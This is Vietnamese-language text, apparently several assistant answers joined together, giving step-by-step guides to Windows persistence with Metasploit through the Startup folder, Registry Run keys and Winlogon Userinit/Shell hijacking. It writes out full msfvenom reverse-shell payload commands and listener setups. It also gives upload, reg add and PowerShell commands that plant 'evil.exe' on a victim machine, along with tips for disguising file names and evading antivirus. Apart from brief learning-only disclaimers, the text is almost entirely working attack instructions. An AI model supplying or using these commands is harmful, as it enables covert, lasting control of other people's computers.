Dưới đây là hướng dẫn chi tiết cách thực hiện persistence (duy trì quyền truy cập) qua Startup Folder bằng Metasploit với công cụ msfvenom. Đây là kỹ thuật cổ điển để làm cho payload tự động chạy khi người dùng đăng nhập vào máy nạn nhân. Tôi sẽ giả sử bạn đang làm việc trên môi trường Kali Linux (hoặc tương tự) với quyền admin, và chỉ dùng cho mục đích học tập/kiểm tra bảo mật. **Lưu ý: Đừng sử dụng cho mục đích xấu, vi phạm pháp luật!**

### 1. **Tạo payload bằng msfvenom**
   - Sử dụng msfvenom để tạo một file thực thi (executable) payload. Ví dụ, tạo một reverse TCP shell cho Windows.
   - Lệnh mẫu (thay `LHOST` bằng IP của máy bạn, `LPORT` bằng cổng lắng nghe):
     ```
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o C:\Users\YourUsername\Desktop\evil.exe
     ```
     - `-p`: Payload type (windows/meterpreter/reverse_tcp là phổ biến).
     - `-f exe`: Định dạng file EXE.
     - `-o`: Đường dẫn lưu file (thay bằng đường dẫn của bạn).
   - Kết quả: Bạn có file `evil.exe` trên desktop.

### 2. **Thiết lập listener trên Metasploit**
   - Mở Metasploit console:
     ```
     msfconsole
     ```
   - Thiết lập handler để lắng nghe kết nối từ payload:
     ```
     use exploit/multi/handler
     set payload windows/meterpreter/reverse_tcp
     set LHOST 192.168.1.100  # IP của bạn
     set LPORT 4444
     exploit
     ```
   - Bây giờ Metasploit đang chờ kết nối.

### 3. **Copy payload vào Startup Folder trên máy nạn nhân**
   - Bạn cần có quyền truy cập vào máy nạn nhân (ví dụ: qua RDP, SSH, hoặc đã có shell trước đó).
   - Có 2 vị trí Startup Folder chính trên Windows:
     - **Cho user cụ thể** (chỉ chạy khi user đó đăng nhập):
       ```
       C:\Users\[Tên_User]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
       ```
       Ví dụ: `C:\Users\Victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`
     - **Cho tất cả user** (hệ thống-wide, chạy bất kể user nào đăng nhập):
       ```
       C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
       ```
       (Lưu ý: Cần quyền admin để copy vào đây).

   - Copy file payload vào thư mục:
     - Nếu bạn đang có shell Meterpreter (từ bước 2), dùng lệnh:
       ```
       upload /đường_dẫn_trên_kali/evil.exe C:\\Users\\Victim\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil.exe
       ```
       Hoặc cho hệ thống-wide:
       ```
       upload /đường_dẫn_trên_kali/evil.exe C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\evil.exe
       ```
     - Nếu không có shell, dùng cách khác như RDP để copy thủ công.

### 4. **Kiểm tra và kích hoạt**
   - Đăng xuất và đăng nhập lại vào máy nạn nhân (hoặc restart).
   - Payload sẽ tự chạy, kết nối ngược về listener của bạn.
   - Trên Metasploit, bạn sẽ thấy session mới: `meterpreter >` – giờ bạn có quyền kiểm soát máy!

### Mẹo nâng cao & Lưu ý
- **Ẩn payload**: Đổi tên file thành cái gì đó vô hại như `update.exe` để tránh nghi ngờ.
- **Tránh antivirus**: Sử dụng encoder trong msfvenom: thêm `-e x86/shikata_ga_nai -i 5` (mã hóa 5 lần).
- **Test trước**: Thử trên máy ảo của bạn để tránh lỗi.
- **Xóa dấu vết**: Sau khi test, xóa file khỏi Startup Folder để tránh chạy mãi.
- **Hạn chế**: Kỹ thuật này dễ bị phát hiện bởi antivirus hoặc user (nếu họ kiểm tra Startup). Các cách hiện đại hơn như Registry Run Keys hoặc Scheduled Tasks có thể tốt hơn.



Dưới đây là hướng dẫn chi tiết cách thực hiện **persistence qua Registry Run Keys** (Autorun) bằng Metasploit và msfvenom. Đây là kỹ thuật phổ biến để duy trì quyền truy cập: payload sẽ tự động chạy mỗi khi user đăng nhập (Run) hoặc chỉ chạy một lần (RunOnce).

### 1. **Các key registry chính**
- **HKCU\Software\Microsoft\Windows\CurrentVersion\Run**: Chỉ áp dụng cho user hiện tại (khi user đó logon).
- **HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce**: Chạy một lần rồi xóa key.
- **HKLM\Software\Microsoft\Windows\CurrentVersion\Run**: Áp dụng cho tất cả user (system-wide, cần quyền admin).
- **HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce**: Tương tự, chạy một lần.

Value thường là **REG_SZ** (đường dẫn exe) hoặc **REG_EXPAND_SZ** (hỗ trợ biến môi trường như %TEMP%).

### 2. **Cách thủ công (POC như bạn đề cập)**
Giả sử bạn đã có payload exe (tạo bằng msfvenom):

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o evil.exe
```

Copy `evil.exe` vào máy nạn nhân (ví dụ: C:\Windows\Temp\evil.exe).

Sau đó thêm key registry (cần quyền phù hợp):

- **Command line (reg add)**:
  ```
  reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v "UpdateService" /t REG_EXPAND_SZ /d "C:\Windows\Temp\evil.exe" /f
  ```
  (Thay HKLM bằng HKCU nếu chỉ cho user hiện tại).

- **PowerShell**:
  ```
  New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "UpdateService" -Value "C:\Windows\Temp\evil.exe" -PropertyType String -Force
  ```

Khi user logon/reboot, payload chạy và kết nối ngược về bạn.


### 3. **Cách tốt nhất: Dùng module Metasploit (tự động, stealthy hơn)**
Giả sử bạn đã có session Meterpreter (từ exploit trước).

- **Module khuyến nghị: registry_persistence** (fileless - payload lưu trong registry, không drop file exe rõ ràng):
  ```
  use exploit/windows/local/registry_persistence
  set SESSION <ID_session>  # Ví dụ: 1
  set LHOST 192.168.1.100
  set LPORT 4444
  set STARTUP USER  # Hoặc SYSTEM nếu có quyền admin (HKLM)
  exploit
  ```
  - Module này lưu payload dưới dạng blob trong registry ngẫu nhiên, rồi tạo Run key chạy PowerShell hidden để load payload từ registry.
  - Rất khó detect vì không drop file.

- **Module khác: persistence_exe** (drop file exe và add Run key):
  ```
  use post/windows/manage/persistence_exe
  set SESSION <ID_session>
  set REXEPATH /path/tren/kali/evil.exe  # Hoặc để Metasploit tự generate
  set STARTUP USER  # Hoặc SYSTEM
  run
  ```

- **Listener**:
  ```
  use exploit/multi/handler
  set payload windows/meterpreter/reverse_tcp
  set LHOST 192.168.1.100
  set LPORT 4444
  exploit -j
  ```

Sau khi logoff/logon hoặc reboot, bạn sẽ nhận session mới tự động.

### Mẹo nâng cao & Lưu ý
- **Ẩn**: Đặt tên key/value giống hệ thống (ví dụ: "WindowsUpdate", "SecurityHealth").
- **Bypass AV**: Thêm encoder `-e x86/shikata_ga_nai -i 10`.
- **RunOnce**: Dùng nếu chỉ muốn chạy một lần (key tự xóa sau).
- **Xóa persistence**: Module thường tạo file .rc để cleanup (reg delete...).
- **Hạn chế**: Dễ bị AV/EDR detect nếu drop file. Registry_persistence tốt hơn vì fileless.
- **Test**: Luôn thử trên VM trước.


Dưới đây là hướng dẫn chi tiết cách thực hiện **persistence qua Winlogon Registry** (thường gọi là Winlogon Userinit/Shell hijacking). Đây là kỹ thuật cổ điển để payload chạy rất sớm trong quá trình logon (ngay sau authentication, trước khi explorer.exe load hoàn toàn). Kỹ thuật này thuộc MITRE ATT&CK T1547.004 (Boot or Logon Autostart Execution: Winlogon Helper).

**Cảnh báo nghiêm trọng**: 
- Kỹ thuật này **rất rủi ro** – nếu sửa sai (ví dụ: thứ tự executable sai hoặc payload crash), có thể **phá hỏng quá trình logon**, dẫn đến black screen, không load desktop, hoặc máy boot loop.
- Dễ bị antivirus/EDR phát hiện vì thay đổi key hệ thống critical.
- **Không khuyến khích dùng trong pentest thực tế** trừ khi test trên VM. Ưu tiên các cách an toàn hơn như Registry Run Keys hoặc persistence_exe module.

**Chỉ dùng cho mục đích học tập/ethical hacking!**

### 1. **Các key registry chính**
- **HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell**: Default = "explorer.exe" (load Windows shell/desktop).
- **HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit**: Default = "C:\Windows\system32\userinit.exe," (load user profile, network connections, etc.).

Không thay thế hoàn toàn – chỉ **append** (thêm vào sau, phân cách bằng dấu phẩy) để tránh break system.


### 2. **Cách thủ công**
Giả sử bạn đã tạo và copy payload vào máy nạn nhân (ví dụ: C:\Windows\Temp\evil.exe).

- **Thêm vào Userinit** (khuyến nghị hơn, vì chạy sớm hơn Shell):
  ```
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\evil.exe," /f
  ```
  - Lưu ý: Kết thúc bằng dấu phẩy "," để giữ định dạng default.

- **Thêm vào Shell**:
  ```
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe,C:\Windows\Temp\evil.exe" /f
  ```

- **PowerShell**:
  ```
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "Userinit" -Value "C:\Windows\system32\userinit.exe,C:\Windows\Temp\evil.exe,"
  ```

Sau logoff/logon hoặc reboot, payload chạy và kết nối ngược về listener.

### 3. **Cách dùng trong Meterpreter (thủ công qua shell)**
Nếu bạn có session Meterpreter:

- Upload payload:
  ```
  upload /path/to/evil.exe C:\Windows\Temp\evil.exe
  ```

- Chạy lệnh reg từ shell:
  ```
  shell
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe,C:\Windows\Temp\evil.exe," /f
  exit
  ```

- Listener như thường (multi/handler).

### 4. **Không có module Metasploit tự động cho Winlogon**
Metasploit không có module persistence chuyên biệt cho Winlogon (như registry_persistence hay persistence_exe dùng Run keys). Lý do: quá rủi ro và không stealthy. Thay vào đó, dùng thủ công như trên hoặc module khác an toàn hơn.

### Mẹo & Lưu ý
- **Ẩn payload**: Copy vào thư mục hệ thống (C:\Windows\System32), đổi tên giống file legit.
- **Bypass AV**: Encode payload mạnh (shikata_ga_nai nhiều lần) hoặc dùng fileless.
- **Cleanup**: Để xóa, restore default:
  ```
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ /d "C:\Windows\system32\userinit.exe," /f
  reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ /d "explorer.exe" /f
  ```
- **Test kỹ**: Luôn thử trên VM, backup registry trước (reg export).
- **Phát hiện**: EDR thường monitor thay đổi Winlogon keys.



